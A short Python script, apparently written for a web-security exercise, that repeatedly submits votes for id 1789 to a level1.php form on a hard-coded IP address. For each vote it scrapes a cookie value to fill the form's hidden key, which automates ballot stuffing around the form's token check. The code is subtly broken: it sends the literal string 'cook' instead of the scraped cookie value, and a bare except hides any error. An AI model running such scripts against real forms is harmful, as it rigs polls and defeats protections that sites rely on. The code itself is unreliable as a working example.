#!/usr/bin/python3
"""
<form method="post">
<input type="text" name="id" />
<input type="submit" name="holdthedoor" />
<input type="hidden" name="key" value="7ea7676af85975f751b6edc83e6c60d8c1ace749" />
</form>

>>> payload = {'key1': 'value1', 'key2': 'value2'}
>>> r = requests.post("http://httpbin.org/post", data=payload)
keys={'text':'lol rofl'}
r=requests.post("http://127.0.0.1/abc.php/POST",params=keys)
"""
import requests
#import pdb; pdb.set_trace()
r = requests.get('http://158.69.76.135/level1.php')
head = r.headers
cook = head['set-cookie']
cook = cook[12:52]
payload = {'id' : '1789', 'holdthedoor' : 'Submit', 'key' : 'cook'}
try:
    for i in range (10):
#        print("case {}.payload {}".format(i, payload))
        cookies = {'HoldTheDoor': 'cook'}
        response = requests.post('http://158.69.76.135/level1.php', data=payload, cookies = cookies)
#        print(response.headers)

        r = requests.get('http://158.69.76.135/level1.php')
        head = r.headers
#        print(head)
        cook = head['set-cookie']
        cook = cook[12:52]
        payload = {'id' : '1789', 'holdthedoor' : 'Submit', 'key' : 'cook'}
except:
    print("Error")
